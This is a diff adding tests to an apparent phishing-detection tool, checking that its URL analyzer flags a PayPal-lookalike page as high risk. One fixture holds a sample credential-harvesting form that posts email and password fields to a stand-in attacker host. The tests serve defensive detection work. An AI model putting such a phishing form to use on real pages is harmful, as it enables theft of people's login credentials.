@@ -518,6 +518,42 @@ def test_ioc_export_dispatch():
         ioc.export_iocs({}, "bogus")
 
 
+def test_url_assess_phishing_page():
+    import osiris.url_analyzer as ua
+
+    html = (
+        "<html><head><title>PayPal - Log In</title></head><body>"
+        "Sign in to your PayPal account."
+        '<form action="https://evil-harvest.ru/collect.php" method="post">'
+        '<input type="text" name="email"><input type="password" name="pw"></form>'
+        "</body></html>"
+    )
+    r = ua.assess_page(html, "http://paypa1-login.com/verify")
+    assert r["risk"] == "high"
+    assert r["final_domain"] == "paypa1-login.com"
+    assert "paypal" in r["targeted_brands"]
+    assert r["credential_forms"] == 1
+    assert r["forms"][0]["cross_domain"] is True
+    texts = " ".join(f["text"] for f in r["flags"])
+    assert "different domain" in texts and "impersonates" in texts
+
+
+def test_url_assess_benign_page():
+    import osiris.url_analyzer as ua
+
+    r = ua.assess_page("<html><head><title>Docs</title></head><body>Hello</body></html>", "https://example.com/")
+    assert r["risk"] == "low"
+    assert r["targeted_brands"] == []
+    assert r["credential_forms"] == 0
+
+
+def test_url_reg_domain_helper():
+    import osiris.url_analyzer as ua
+
+    assert ua._reg_domain("login.secure.paypal.com") == "paypal.com"
+    assert ua._reg_domain("evil.ru:8080") == "evil.ru"
+
+
 def test_email_triage_spoof_detection():
     import osiris.email_triage as et
 
